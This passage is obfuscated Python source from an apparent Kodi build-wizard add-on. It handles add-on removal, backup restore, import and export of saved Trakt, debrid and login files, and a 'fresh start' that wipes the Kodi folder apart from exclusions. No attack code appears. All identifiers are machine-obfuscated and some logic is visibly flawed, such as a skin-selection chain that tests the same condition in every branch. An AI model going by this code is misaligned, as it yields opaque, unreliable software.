		def onAction (OO00OO0OO00OOO0O0 ,O0OOO0OOOO0OOOO0O ):#line:4602
			if O0OOO0OOOO0OOOO0O ==ACTION_PREVIOUS_MENU :OO00OO0OO00OOO0O0 .close ()#line:4603
			elif O0OOO0OOOO0OOOO0O ==ACTION_NAV_BACK :OO00OO0OO00OOO0O0 .close ()#line:4604
	if default ==None :default =wiz .Grab_Log (True )#line:4605
	O00OOOO00OOOO0O00 =O0000000O00O000OO ("LogViewer.xml",ADDON .getAddonInfo ('path'),'DefaultSkin',default =default )#line:4606
	O00OOOO00OOOO0O00 .doModal ()#line:4607
	del O00OOOO00OOOO0O00 #line:4608
def removeAddon (OOOOO000OO0OO00OO ,OO000OOO0OO0OOOOO ,over =False ):#line:4610
	if not over ==False :#line:4611
		O00O0O0OOO000OOO0 =1 #line:4612
	else :#line:4613
		O00O0O0OOO000OOO0 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Are you sure you want to delete the addon:'%COLOR2 ,'Name: [COLOR %s]%s[/COLOR]'%(COLOR1 ,OO000OOO0OO0OOOOO ),'ID: [COLOR %s]%s[/COLOR][/COLOR]'%(COLOR1 ,OOOOO000OO0OO00OO ),yeslabel ='[B][COLOR green]Remove Addon[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]')#line:4614
	if O00O0O0OOO000OOO0 ==1 :#line:4615
		OO0000O0000OOO00O =os .path .join (ADDONS ,OOOOO000OO0OO00OO )#line:4616
		wiz .log ("Removing Addon %s"%OOOOO000OO0OO00OO )#line:4617
		wiz .cleanHouse (OO0000O0000OOO00O )#line:4618
		xbmc .sleep (1000 )#line:4619
		try :shutil .rmtree (OO0000O0000OOO00O )#line:4620
		except Exception as O00O000000OOOOOOO :wiz .log ("Error removing %s"%OOOOO000OO0OO00OO ,xbmc .LOGNOTICE )#line:4621
		removeAddonData (OOOOO000OO0OO00OO ,OO000OOO0OO0OOOOO ,over )#line:4622
	if over ==False :#line:4623
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]%s Removed[/COLOR]"%(COLOR2 ,OO000OOO0OO0OOOOO ))#line:4624
def removeAddonData (OOOOO000O0O0O000O ,name =None ,over =False ):#line:4626
	if OOOOO000O0O0O000O =='all':#line:4627
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4628
			wiz .cleanHouse (ADDOND )#line:4629
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4630
	elif OOOOO000O0O0O000O =='uninstalled':#line:4631
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder for uninstalled addons?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4632
			O000O00O0O0O00O00 =0 #line:4633
			for O00O00OOOO0O00O0O in glob .glob (os .path .join (ADDOND ,'*')):#line:4634
				OOOOO000O0000OOOO =O00O00OOOO0O00O0O .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:4635
				if OOOOO000O0000OOOO in EXCLUDES :pass #line:4636
				elif os .path .exists (os .path .join (ADDONS ,OOOOO000O0000OOOO )):pass #line:4637
				else :wiz .cleanHouse (O00O00OOOO0O00O0O );O000O00O0O0O00O00 +=1 ;wiz .log (O00O00OOOO0O00O0O );shutil .rmtree (O00O00OOOO0O00O0O )#line:4638
			wiz .LogNotify ('[COLOR %s]Clean up Uninstalled[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,O000O00O0O0O00O00 ))#line:4639
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4640
	elif OOOOO000O0O0O000O =='empty':#line:4641
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] empty addon data folders in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4642
			O000O00O0O0O00O00 =wiz .emptyfolder (ADDOND )#line:4643
			wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,O000O00O0O0O00O00 ))#line:4644
		else :wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4645
	else :#line:4646
		OO0O000O0O00OO000 =os .path .join (USERDATA ,'addon_data',OOOOO000O0O0O000O )#line:4647
		if OOOOO000O0O0O000O in EXCLUDES :#line:4648
			wiz .LogNotify ("[COLOR %s]Protected Plugin[/COLOR]"%COLOR1 ,"[COLOR %s]Not allowed to remove Addon_Data[/COLOR]"%COLOR2 )#line:4649
		elif os .path .exists (OO0O000O0O00OO000 ):#line:4650
			if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you also like to remove the addon data for:[/COLOR]'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,OOOOO000O0O0O000O ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4651
				wiz .cleanHouse (OO0O000O0O00OO000 )#line:4652
				try :#line:4653
					shutil .rmtree (OO0O000O0O00OO000 )#line:4654
				except :#line:4655
					wiz .log ("Error deleting: %s"%OO0O000O0O00OO000 )#line:4656
			else :#line:4657
				wiz .log ('Addon data for %s was not removed'%OOOOO000O0O0O000O )#line:4658
	wiz .refresh ()#line:4659
def restoreit (O0O0OO00O0000OO00 ):#line:4661
	if O0O0OO00O0000OO00 =='build':#line:4662
		O0OOO0000O0000000 =freshStart ('restore')#line:4663
		if O0OOO0000O0000000 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Local Restore Cancelled[/COLOR]"%COLOR2 );return #line:4664
	if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary']:#line:4665
		wiz .skinToDefault ()#line:4666
	wiz .restoreLocal (O0O0OO00O0000OO00 )#line:4667
def restoreextit (O0OOO0OOOO0O000O0 ):#line:4669
	if O0OOO0OOOO0O000O0 =='build':#line:4670
		OOOOO00O000OO000O =freshStart ('restore')#line:4671
		if OOOOO00O000OO000O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]External Restore Cancelled[/COLOR]"%COLOR2 );return #line:4672
	wiz .restoreExternal (O0OOO0OOOO0O000O0 )#line:4673
def buildInfo (O00O00000O0O000OO ):#line:4675
	if wiz .workingURL (SPEEDFILE )==True :#line:4676
		if wiz .checkBuild (O00O00000O0O000OO ,'url'):#line:4677
			O00O00000O0O000OO ,OOOOOO000O0OO00O0 ,OOO0O0O0OOOO000O0 ,OOOO0OOOOOO00OO00 ,OOOOO0O0000OOO0O0 ,O0OO0O0OO00O0OO0O ,OOO0OO00000OOOO00 ,O000000O00OOOOO0O ,O00OO000O00OO0OOO ,O00OO00O00OOO00OO ,OOOOO00O0O0OO00OO =wiz .checkBuild (O00O00000O0O000OO ,'all')#line:4678
			O00OO00O00OOO00OO ='Yes'if O00OO00O00OOO00OO .lower ()=='yes'else 'No'#line:4679
			O0OO0OO000OOOO0OO ="[COLOR %s]שם הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O00O00000O0O000OO )#line:4680
			O0OO0OO000OOOO0OO +="[COLOR %s]גירסת הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OOOOOO000O0OO00O0 )#line:4681
			if not O0OO0O0OO00O0OO0O =="http://":#line:4682
				OOO00OOOOO0OO0O00 =wiz .themeCount (O00O00000O0O000OO ,False )#line:4683
				O0OO0OO000OOOO0OO +="[COLOR %s]Build Theme(s):[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,', '.join (OOO00OOOOO0OO0O00 ))#line:4684
			O0OO0OO000OOOO0OO +="[COLOR %s]קודי גירסה:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OOOOO0O0000OOO0O0 )#line:4685
			O0OO0OO000OOOO0OO +="[COLOR %s]Adult Content:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O00OO00O00OOO00OO )#line:4686
			O0OO0OO000OOOO0OO +="[COLOR %s]תאור:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OOOOO00O0O0OO00OO )#line:4687
			wiz .TextBox (ADDONTITLE ,O0OO0OO000OOOO0OO )#line:4688
		else :wiz .log ("Invalid Build Name!")#line:4689
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4690
def buildVideo (O0000000O0OOOO000 ):#line:4692
	wiz .log ("DDDDDDDDDDDDDDDDDDDDDDDDD: %s"%wiz .workingURL (SPEEDFILE ))#line:4693
	if wiz .workingURL (SPEEDFILE )==True :#line:4694
		OOOOOOO00O0O00OOO =wiz .checkBuild (O0000000O0OOOO000 ,'preview')#line:4695
		wiz .log ("FFFFFFFFFFFFFFFFFFFFFFFFFF: %s"%O0000000O0OOOO000 )#line:4696
		if OOOOOOO00O0O00OOO and not OOOOOOO00O0O00OOO =='http://':playVideo (OOOOOOO00O0O00OOO )#line:4697
		else :wiz .log ("[%s]Unable to find url for video preview"%O0000000O0OOOO000 )#line:4698
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4699
def dependsList (OOOOO0OOO0O0OOO00 ):#line:4701
	OO0OO0000OO0OOOOO =os .path .join (ADDONS ,OOOOO0OOO0O0OOO00 ,'addon.xml')#line:4702
	if os .path .exists (OO0OO0000OO0OOOOO ):#line:4703
		OOO0000O0OO0O0000 =open (OO0OO0000OO0OOOOO ,mode ='r');O00OOO0OO00OO000O =OOO0000O0OO0O0000 .read ();OOO0000O0OO0O0000 .close ();#line:4704
		OO0OOO000O00O00O0 =wiz .parseDOM (O00OOO0OO00OO000O ,'import',ret ='addon')#line:4705
		O00OO0000O0O0OOOO =[]#line:4706
		for OO0OO0000O0OOOO0O in OO0OOO000O00O00O0 :#line:4707
			if not 'xbmc.python'in OO0OO0000O0OOOO0O :#line:4708
				O00OO0000O0O0OOOO .append (OO0OO0000O0OOOO0O )#line:4709
		return O00OO0000O0O0OOOO #line:4710
	return []#line:4711
def manageSaveData (O0OOO0OO0OOO00000 ):#line:4713
	if O0OOO0OO0OOO00000 =='import':#line:4714
		O0OOOO0OOO000O000 =os .path .join (ADDONDATA ,'temp')#line:4715
		if not os .path .exists (O0OOOO0OOO000O000 ):os .makedirs (O0OOOO0OOO000O000 )#line:4716
		O0OO0OO00000O0O0O =DIALOG .browse (1 ,'[COLOR %s]Select the location of the SaveData.zip[/COLOR]'%COLOR2 ,'files','.zip',False ,False ,HOME )#line:4717
		if not O0OO0OO00000O0O0O .endswith ('.zip'):#line:4718
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Import Data Error![/COLOR]"%(COLOR2 ))#line:4719
			return #line:4720
		O00O00O000OOOOO00 =os .path .join (MYBUILDS ,'SaveData.zip')#line:4721
		O0OOOOOO0O00OO000 =xbmcvfs .copy (O0OO0OO00000O0O0O ,O00O00O000OOOOO00 )#line:4722
		wiz .log ("%s"%str (O0OOOOOO0O00OO000 ))#line:4723
		extract .all (xbmc .translatePath (O00O00O000OOOOO00 ),O0OOOO0OOO000O000 )#line:4724
		OO00O0O0OOO0O00O0 =os .path .join (O0OOOO0OOO000O000 ,'trakt')#line:4725
		O00OO0OOO00OOO0OO =os .path .join (O0OOOO0OOO000O000 ,'login')#line:4726
		O00O0O0OO00OO00O0 =os .path .join (O0OOOO0OOO000O000 ,'debrid')#line:4727
		O0OO0OOO0O000OO0O =0 #line:4728
		if os .path .exists (OO00O0O0OOO0O00O0 ):#line:4729
			O0OO0OOO0O000OO0O +=1 #line:4730
			OOO0OOOO0OO0O0OO0 =os .listdir (OO00O0O0OOO0O00O0 )#line:4731
			if not os .path .exists (traktit .TRAKTFOLD ):os .makedirs (traktit .TRAKTFOLD )#line:4732
			for O00OO0O000000O0O0 in OOO0OOOO0OO0O0OO0 :#line:4733
				OOOOO0O00O0OO0O00 =os .path .join (traktit .TRAKTFOLD ,O00OO0O000000O0O0 )#line:4734
				OO0OO0O0OOOO0OO0O =os .path .join (OO00O0O0OOO0O00O0 ,O00OO0O000000O0O0 )#line:4735
				if os .path .exists (OOOOO0O00O0OO0O00 ):#line:4736
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,O00OO0O000000O0O0 ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4737
					else :os .remove (OOOOO0O00O0OO0O00 )#line:4738
				shutil .copy (OO0OO0O0OOOO0OO0O ,OOOOO0O00O0OO0O00 )#line:4739
			traktit .importlist ('all')#line:4740
			traktit .traktIt ('restore','all')#line:4741
		if os .path .exists (O00OO0OOO00OOO0OO ):#line:4742
			O0OO0OOO0O000OO0O +=1 #line:4743
			OOO0OOOO0OO0O0OO0 =os .listdir (O00OO0OOO00OOO0OO )#line:4744
			if not os .path .exists (loginit .LOGINFOLD ):os .makedirs (loginit .LOGINFOLD )#line:4745
			for O00OO0O000000O0O0 in OOO0OOOO0OO0O0OO0 :#line:4746
				OOOOO0O00O0OO0O00 =os .path .join (loginit .LOGINFOLD ,O00OO0O000000O0O0 )#line:4747
				OO0OO0O0OOOO0OO0O =os .path .join (O00OO0OOO00OOO0OO ,O00OO0O000000O0O0 )#line:4748
				if os .path .exists (OOOOO0O00O0OO0O00 ):#line:4749
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,O00OO0O000000O0O0 ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4750
					else :os .remove (OOOOO0O00O0OO0O00 )#line:4751
				shutil .copy (OO0OO0O0OOOO0OO0O ,OOOOO0O00O0OO0O00 )#line:4752
			loginit .importlist ('all')#line:4753
			loginit .loginIt ('restore','all')#line:4754
		if os .path .exists (O00O0O0OO00OO00O0 ):#line:4755
			O0OO0OOO0O000OO0O +=1 #line:4756
			OOO0OOOO0OO0O0OO0 =os .listdir (O00O0O0OO00OO00O0 )#line:4757
			if not os .path .exists (debridit .REALFOLD ):os .makedirs (debridit .REALFOLD )#line:4758
			for O00OO0O000000O0O0 in OOO0OOOO0OO0O0OO0 :#line:4759
				OOOOO0O00O0OO0O00 =os .path .join (debridit .REALFOLD ,O00OO0O000000O0O0 )#line:4760
				OO0OO0O0OOOO0OO0O =os .path .join (O00O0O0OO00OO00O0 ,O00OO0O000000O0O0 )#line:4761
				if os .path .exists (OOOOO0O00O0OO0O00 ):#line:4762
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,O00OO0O000000O0O0 ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4763
					else :os .remove (OOOOO0O00O0OO0O00 )#line:4764
				shutil .copy (OO0OO0O0OOOO0OO0O ,OOOOO0O00O0OO0O00 )#line:4765
			debridit .importlist ('all')#line:4766
			debridit .debridIt ('restore','all')#line:4767
		wiz .cleanHouse (O0OOOO0OOO000O000 )#line:4768
		wiz .removeFolder (O0OOOO0OOO000O000 )#line:4769
		os .remove (O00O00O000OOOOO00 )#line:4770
		if O0OO0OOO0O000OO0O ==0 :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Failed[/COLOR]"%COLOR2 )#line:4771
		else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Complete[/COLOR]"%COLOR2 )#line:4772
	elif O0OOO0OO0OOO00000 =='export':#line:4773
		OOOOOOO00O0O0O000 =xbmc .translatePath (MYBUILDS )#line:4774
		OO0O0O00OOO0O00OO =[traktit .TRAKTFOLD ,debridit .REALFOLD ,loginit .LOGINFOLD ]#line:4775
		traktit .traktIt ('update','all')#line:4776
		loginit .loginIt ('update','all')#line:4777
		debridit .debridIt ('update','all')#line:4778
		O0OO0OO00000O0O0O =DIALOG .browse (3 ,'[COLOR %s]Select where you wish to export the savedata zip?[/COLOR]'%COLOR2 ,'files','',False ,True ,HOME )#line:4779
		O0OO0OO00000O0O0O =xbmc .translatePath (O0OO0OO00000O0O0O )#line:4780
		O00O00OOO0OO000O0 =os .path .join (OOOOOOO00O0O0O000 ,'SaveData.zip')#line:4781
		O0O0O0O000000O0OO =zipfile .ZipFile (O00O00OOO0OO000O0 ,mode ='w')#line:4782
		for OO00O000OOOO00O00 in OO0O0O00OOO0O00OO :#line:4783
			if os .path .exists (OO00O000OOOO00O00 ):#line:4784
				OOO0OOOO0OO0O0OO0 =os .listdir (OO00O000OOOO00O00 )#line:4785
				for O00O000OO0O0OO0O0 in OOO0OOOO0OO0O0OO0 :#line:4786
					O0O0O0O000000O0OO .write (os .path .join (OO00O000OOOO00O00 ,O00O000OO0O0OO0O0 ),os .path .join (OO00O000OOOO00O00 ,O00O000OO0O0OO0O0 ).replace (ADDONDATA ,''),zipfile .ZIP_DEFLATED )#line:4787
		O0O0O0O000000O0OO .close ()#line:4788
		if O0OO0OO00000O0O0O ==OOOOOOO00O0O0O000 :#line:4789
			DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O00O00OOO0OO000O0 ))#line:4790
		else :#line:4791
			try :#line:4792
				xbmcvfs .copy (O00O00OOO0OO000O0 ,os .path .join (O0OO0OO00000O0O0O ,'SaveData.zip'))#line:4793
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,os .path .join (O0OO0OO00000O0O0O ,'SaveData.zip')))#line:4794
			except :#line:4795
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O00O00OOO0OO000O0 ))#line:4796
def freshStart (install =None ,over =False ):#line:4801
	if USERNAME =='':#line:4802
		ADDON .openSettings ()#line:4803
		sys .exit ()#line:4804
	OO0000OOO0O0O0OO0 =(SPEEDFILE )#line:4805
	(OO0000OOO0O0O0OO0 )#line:4806
	O000OO000O00O00O0 =(wiz .workingURL (OO0000OOO0O0O0OO0 ))#line:4807
	(O000OO000O00O00O0 )#line:4808
	if KEEPTRAKT =='true':#line:4809
		traktit .autoUpdate ('all')#line:4810
		wiz .setS ('traktlastsave',str (THREEDAYS ))#line:4811
	if KEEPREAL =='true':#line:4812
		debridit .autoUpdate ('all')#line:4813
		wiz .setS ('debridlastsave',str (THREEDAYS ))#line:4814
	if KEEPLOGIN =='true':#line:4815
		loginit .autoUpdate ('all')#line:4816
		wiz .setS ('loginlastsave',str (THREEDAYS ))#line:4817
	if over ==True :O0OOO00OOO0O0OOOO =1 #line:4818
	elif install =='restore':O0OOO00OOO0O0OOOO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]בחרת לשחזר את הבילד מקובץ גיבוי קודם"%COLOR2 ,"האם להמשיך?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4819
	elif install :O0OOO00OOO0O0OOOO =1 #line:4820
	else :O0OOO00OOO0O0OOOO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]התקנת הבילד"%COLOR2 ,"קודי אנונימוס?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4821
	if O0OOO00OOO0O0OOOO :#line:4822
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:4823
			OOO0O00O00O0O0O00 ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:4824
			skinSwitch .swapSkins (OOO0O00O00O0O0O00 )#line:4827
			OO00OOOOOOOOOO0OO =0 #line:4828
			xbmc .sleep (1000 )#line:4829
			while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OO00OOOOOOOOOO0OO <150 :#line:4830
				OO00OOOOOOOOOO0OO +=1 #line:4831
				xbmc .sleep (1000 )#line:4832
				wiz .ebi ('SendAction(Select)')#line:4833
			if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4834
				wiz .ebi ('SendClick(11)')#line:4835
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Timed Out![/COLOR]'%COLOR2 );return False #line:4836
			xbmc .sleep (1000 )#line:4837
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:4838
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Failed![/COLOR]'%COLOR2 )#line:4839
			return #line:4840
		wiz .addonUpdates ('set')#line:4841
		O00OO00O00OOOOOO0 =os .path .abspath (HOME )#line:4842
		DP .create (ADDONTITLE ,"[COLOR %s]מחשב קבצים ותיקיות"%COLOR2 ,'','אנא המתן![/COLOR]')#line:4843
		O000O0O000OO0OOOO =sum ([len (OO00O0O0O0000OO0O )for O000O0OO0O0O0OOOO ,OO00OO0OO0OOO0OO0 ,OO00O0O0O0000OO0O in os .walk (O00OO00O00OOOOOO0 )]);OO00O0OO0O0OO00O0 =0 #line:4844
		DP .update (0 ,"[COLOR %s]Gathering Excludes list."%COLOR2 )#line:4845
		EXCLUDES .append ('My_Builds')#line:4846
		EXCLUDES .append ('archive_cache')#line:4847
		EXCLUDES .append ('script.module.requests')#line:4848
		EXCLUDES .append ('myfav.anon')#line:4849
		if KEEPREPOS =='true':#line:4850
			O00OO0O0O0O0O0OO0 =glob .glob (os .path .join (ADDONS ,'repo*/'))#line:4851
			for O00OO00OOO0OOO0O0 in O00OO0O0O0O0O0OO0 :#line:4852
				O00OOO0O00O0OOO00 =os .path .split (O00OO00OOO0OOO0O0 [:-1 ])[1 ]#line:4853
				if not O00OOO0O00O0OOO00 ==EXCLUDES :#line:4854
					EXCLUDES .append (O00OOO0O00O0OOO00 )#line:4855
		if KEEPSUPER =='true':#line:4856
			EXCLUDES .append ('plugin.program.super.favourites')#line:4857
		if KEEPMOVIELIST =='true':#line:4858
			EXCLUDES .append ('plugin.video.metalliq')#line:4859
		if KEEPMOVIELIST =='true':#line:4860
			EXCLUDES .append ('plugin.video.anonymous.wall')#line:4861
		if KEEPADDONS =='true':#line:4862
			EXCLUDES .append ('addons')#line:4863
		if KEEPTELEMEDIA =='true':#line:4864
			EXCLUDES .append ('plugin.video.telemedia')#line:4865
		EXCLUDES .append ('plugin.video.elementum')#line:4870
		EXCLUDES .append ('script.elementum.burst')#line:4871
		EXCLUDES .append ('script.elementum.burst-master')#line:4872
		EXCLUDES .append ('plugin.video.quasar')#line:4873
		EXCLUDES .append ('script.quasar.burst')#line:4874
		EXCLUDES .append ('skin.estuary')#line:4875
		if KEEPWHITELIST =='true':#line:4878
			O0OO0OOO0OOO0O000 =''#line:4879
			OO00OOOOOOOOO0OO0 =wiz .whiteList ('read')#line:4880
			if len (OO00OOOOOOOOO0OO0 )>0 :#line:4881
				for O00OO00OOO0OOO0O0 in OO00OOOOOOOOO0OO0 :#line:4882
					try :O0OOOOOO0O0OO0OOO ,O0OO000OOOOOOOO0O ,OOOO0O00O0000000O =O00OO00OOO0OOO0O0 #line:4883
					except :pass #line:4884
					if OOOO0O00O0000000O .startswith ('pvr'):O0OO0OOO0OOO0O000 =O0OO000OOOOOOOO0O #line:4885
					O00O0000O0O00O00O =dependsList (OOOO0O00O0000000O )#line:4886
					for OO0O0O000O00O0O0O in O00O0000O0O00O00O :#line:4887
						if not OO0O0O000O00O0O0O in EXCLUDES :#line:4888
							EXCLUDES .append (OO0O0O000O00O0O0O )#line:4889
						O000O0OOO0OOO00O0 =dependsList (OO0O0O000O00O0O0O )#line:4890
						for O00O00O0OO0O0000O in O000O0OOO0OOO00O0 :#line:4891
							if not O00O00O0OO0O0000O in EXCLUDES :#line:4892
								EXCLUDES .append (O00O00O0OO0O0000O )#line:4893
					if not OOOO0O00O0000000O in EXCLUDES :#line:4894
						EXCLUDES .append (OOOO0O00O0000000O )#line:4895
				if not O0OO0OOO0OOO0O000 =='':wiz .setS ('pvrclient',OOOO0O00O0000000O )#line:4896
		if wiz .getS ('pvrclient')=='':#line:4897
			for O00OO00OOO0OOO0O0 in EXCLUDES :#line:4898
				if O00OO00OOO0OOO0O0 .startswith ('pvr'):#line:4899
					wiz .setS ('pvrclient',O00OO00OOO0OOO0O0 )#line:4900
		DP .update (0 ,"[COLOR %s]מנקה קבצים ותיקיות:"%COLOR2 )#line:4901
		OOOOOO0OO0OOOO00O =wiz .latestDB ('Addons')#line:4902
		for O0OOO0000OO00OOO0 ,OO0OOOO00000OOO0O ,OOO0O0O00OO00OOO0 in os .walk (O00OO00O00OOOOOO0 ,topdown =True ):#line:4903
			OO0OOOO00000OOO0O [:]=[O0OOOO0OOO00O0O00 for O0OOOO0OOO00O0O00 in OO0OOOO00000OOO0O if O0OOOO0OOO00O0O00 not in EXCLUDES ]#line:4904
			for O0OOOOOO0O0OO0OOO in OOO0O0O00OO00OOO0 :#line:4905
				OO00O0OO0O0OO00O0 +=1 #line:4906
				OOOO0O00O0000000O =O0OOO0000OO00OOO0 .replace ('/','\\').split ('\\')#line:4907
				OO00OOOOOOOOOO0OO =len (OOOO0O00O0000000O )-1 #line:4909
				if OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -2 ]=='userdata'and OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO0O00O0000000O [OO00OOOOOOOOOO0OO ]and KEEPSKIN =='true':wiz .log ("Keep Skin: %s"%os .path .join (O0OOO0000OO00OOO0 ,O0OOOOOO0O0OO0OOO ),xbmc .LOGNOTICE )#line:4910
				elif O0OOOOOO0O0OO0OOO =='MyVideos99.db'and OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -1 ]=='userdata'and OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O0OOO0000OO00OOO0 ,O0OOOOOO0O0OO0OOO ),xbmc .LOGNOTICE )#line:4911
				elif O0OOOOOO0O0OO0OOO =='MyVideos107.db'and OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -1 ]=='userdata'and OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O0OOO0000OO00OOO0 ,O0OOOOOO0O0OO0OOO ),xbmc .LOGNOTICE )#line:4912
				elif O0OOOOOO0O0OO0OOO =='MyVideos116.db'and OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -1 ]=='userdata'and OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O0OOO0000OO00OOO0 ,O0OOOOOO0O0OO0OOO ),xbmc .LOGNOTICE )#line:4913
				elif O0OOOOOO0O0OO0OOO =='MyVideos99.db'and OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -1 ]=='userdata'and OOOO0O00O0000000O [OO00OOOOOOOOOO0OO -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O0OOO0000OO00OOO0 ,O0OOOOOO0O0OO0OOO ),xbmc .LOGNOTICE )#line:4914
